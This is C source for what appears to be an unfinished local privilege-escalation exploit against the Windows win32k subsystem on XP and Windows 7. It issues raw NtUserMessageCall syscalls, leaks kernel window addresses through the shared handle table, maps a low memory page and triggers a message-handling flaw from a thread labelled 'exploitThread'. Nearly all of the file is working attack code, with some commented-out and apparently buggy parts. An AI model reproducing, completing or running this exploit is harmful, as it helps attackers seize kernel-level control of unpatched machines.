#include "exploit.h"

// http://j00ru.vexillium.org/win32k_syscalls/ WinXP SP2  0x11cc  WIn7 SP0 0x11ea
#define __NR_NtUserMessageCall  0x11cc

ULONG __stdcall _NtUserMessageCall(HWND hWnd, UINT Msg,	WPARAM 	wParam,	LPARAM lParam,	ULONG_PTR ResultInfo, DWORD dwType,	BOOL Ansi) {
	__asm
	{
		mov edx, 0x7FFE0300 // KiFastSystemCall
		mov eax, __NR_NtUserMessageCall // API Address
		call edx // Go!
		retn 0x1c // Number of params (7*4)
	}
}

PSHAREDINFO LocateSharedInfo()
{
	// If Win7 we could just use (PSHAREDINFO)GetProcAddress(GetModuleHandle("USER32.dll"), "gSharedInfo");
	ULONG_PTR pfnUserRegisterWowHandlers = (ULONG_PTR)GetProcAddress(GetModuleHandle("USER32.dll"), "UserRegisterWowHandlers");
	ULONG i;

        for (i = pfnUserRegisterWowHandlers; 
             i <= pfnUserRegisterWowHandlers +0x250; 
             ++i )
        {
            if (0x40c7 == *(WORD*)i && 
                0xb8 == *(BYTE*)(i + 7))
            {
                return (PSHAREDINFO)(*(DWORD*)(i + 8));
            }
        }
}

LRESULT APIENTRY MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	LPMSG msg2;
	switch (uMsg)
	{
	case WM_NULL:
		printf("Unicode Window Listening for Messages\r\n");
		while(TRUE)
		{
			GetMessageW(msg2, hwnd, 0, 0);
			Sleep(10);
		}
	case WM_CREATE:
		printf("Unicode Window created %p\r\n", hwnd);
		break;
	case WM_GETTEXT:
		printf("Got message!!!\r\n");
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}
LRESULT APIENTRY ExploitWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	PThreadData threadData = (PThreadData)lParam;

	switch (uMsg)
	{
	case WM_GETTEXT:
		printf("Sending ANSI Message to UNICODE target hwnd %p\r\n", threadData->target);
		_NtUserMessageCall(threadData->target, WM_GETTEXT, 0x8, NULL, 0x0, 0x2b3, 0x2);
		break;
	case WM_CREATE:
		printf("Ansi Window Created %p\r\n", hwnd);
		break;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}

DWORD WINAPI exploitThread( LPVOID lpParam )
{
	HWND hwnd;
	MSG Msg;
	WNDCLASSEXA  WindowClassEx;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	PThreadData threadData = (PThreadData)lpParam;
	const char lpcszClassName [] = "exploitClass";
	CREATESTRUCT strct = { &lpParam };

	printf("Thread started\r\n");
	ZeroMemory(&WindowClassEx, sizeof(WNDCLASSEXA));
	WindowClassEx.cbSize = sizeof(WNDCLASSEXA);
	WindowClassEx.lpfnWndProc = ExploitWndProc;
	WindowClassEx.hInstance = hInstance;
	WindowClassEx.lpszClassName = lpcszClassName;

	if (RegisterClassExA(&WindowClassEx) != 0)
	{
		// Create a message-only window
		hwnd = CreateWindowExA(0, lpcszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, &strct);
		if (hwnd == NULL)
			UnregisterClassA(lpcszClassName, hInstance);
	}

	printf("Thread sleeping...\r\n");
	Sleep(2000);
	printf("triggering the vulnerability\r\n");
	SendMessageA(hwnd, WM_GETTEXT, 0, (LPARAM)threadData);
	//SendMessageA(hwnd, WM_GETTEXT, 0, (LPARAM)threadData);
	//SendMessageA(hwnd, WM_GETTEXT, 0, (LPARAM)threadData);

	return 0;
}

HWND hwnd;

int	main(int arc, char **argv)
{
	MSG Msg;
	wchar_t lpcszClassName [] = L"messageClass";
	WNDCLASSEXW  WindowClassEx;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HANDLE hDevice;
	HMODULE hUser32;
	HMODULE hNtDLL;
	HRESULT res;
	PSHAREDINFO pSharedInfo;
	PSERVERINFO pServerInfo;
	HANDLEENTRY *UserHandleTable;
	MEMORY_BASIC_INFORMATION meminfo;

	// Thread
	HANDLE  hThread;
	DWORD   dwThreadId;
	ThreadData threadData;

	int i;
	PVOID kernelWindowHandle;
	SYSTEM_INFO SystemInfo;
	ULONG_PTR addr = 0x00200000;
	ULONG Size;

	getchar();

	GetSystemInfo(&SystemInfo);
	Size = SystemInfo.dwPageSize;
	hNtDLL = GetModuleHandle("ntdll.dll");
	printf("NtDLL 0x%p\r\n", hNtDLL);
	NtAllocateVirtualMemory = GetProcAddress(hNtDLL, "NtAllocateVirtualMemory");
	printf("NtAllocateVirtualMemory 0x%p\r\n", NtAllocateVirtualMemory);

	while ((NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &Size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) != S_OK)
	{
		printf("Failed to allocate addr %p \r\n", addr);
		addr += SystemInfo.dwPageSize*16;
	}

	// Should check this is of format 0x00xx00yy
	printf("Allocated Page @ 0x%p\r\n", addr);

	ZeroMemory(&WindowClassEx, sizeof(WNDCLASSEXW));
	WindowClassEx.cbSize = sizeof(WNDCLASSEXW);
	WindowClassEx.lpfnWndProc = MainWndProc;
	WindowClassEx.hInstance = hInstance;
	WindowClassEx.lpszClassName = lpcszClassName;

	if (RegisterClassExW(&WindowClassEx) != 0)
	{
		// Create a message-only window
		hwnd = CreateWindowExW(0, lpcszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
		if (hwnd == NULL)
			UnregisterClassW(lpcszClassName, hInstance);
	}
/*
Why??? Already created window and class...
[-] kernel class registered: 00001338
[-] kernel proc called from usermode. msg: 0x0024, wparam: 0x00000000, lparam: 0x001bf310  WM_GETMINMAXINFO
[-] kernel proc called from usermode. msg: 0x0081, wparam: 0x00000000, lparam: 0x001bf308 WM_NCCREATE
[-] kernel proc called from usermode. msg: 0x0083, wparam: 0x00000000, lparam: 0x001bf330 WM_NCCALCSIZE
[-] kernel proc called from usermode. msg: 0x0001, wparam: 0x00000000, lparam: 0x001bf2fc WM_CREATE 
*/
	printf("kernel class %p\r\n", &WindowClassEx);
	printf("kernel windows %p\r\n", hwnd);

	//http://volatility-labs.blogspot.co.uk/2012/09/movp-33-analyzing-user-handles-and.html
	hUser32 = GetModuleHandle("USER32.dll");
	printf("User32 @ %p\r\n", hUser32);
	pSharedInfo = LocateSharedInfo();
	printf("SharedInfo @ %p\r\n", pSharedInfo);

	UserHandleTable = pSharedInfo->aheList; // Does this fail on x64 due to ptr size in struct def?
	printf("aheList @ %p\r\n", UserHandleTable);

	pServerInfo = pSharedInfo->psi;
	printf("pServerInfo @ %p\r\n", pServerInfo);
	printf("Handle Count %d\r\n", pServerInfo->cHandleEntries);
	printf("User Delta %llu\r\n", pSharedInfo->ulSharedDelta);

	kernelWindowHandle = (hwnd - pSharedInfo->ulSharedDelta);
	printf("Kernel Window Handle @ %p\r\n", (hwnd + pSharedInfo->ulSharedDelta)); 
	//for(i = 0; i < pServerInfo->cHandleEntries; i++ ) 
	//{
	//	__try
	//	{
	//		// https://gist.github.com/topwanderings/6296537
	//		// How do we know this our window?
	//		if( UserHandleTable[i].bType == TYPE_WINDOW )
	//		{
	//			kernelWindowHandle = UserHandleTable[i].phead;
	//			printf("Kernel Window Handle found! %p\r\n", kernelWindowHandle);
	//			getchar();
	//			break;
	//		}
	//	}
	//	__except(EXCEPTION_EXECUTE_HANDLER) {}
 //   }

	threadData.target = kernelWindowHandle;//hwnd;
	hThread = CreateThread( 
            NULL,                   // default security attributes
            0,                      // use default stack size  
            exploitThread,       // thread function name
            &threadData,          // argument to thread function 
            0,                      // use default creation flags 
            &dwThreadId);

	// Use this to tell the window to go into a GetMessage loop
	SendMessage(hwnd, WM_NULL,0,0);
}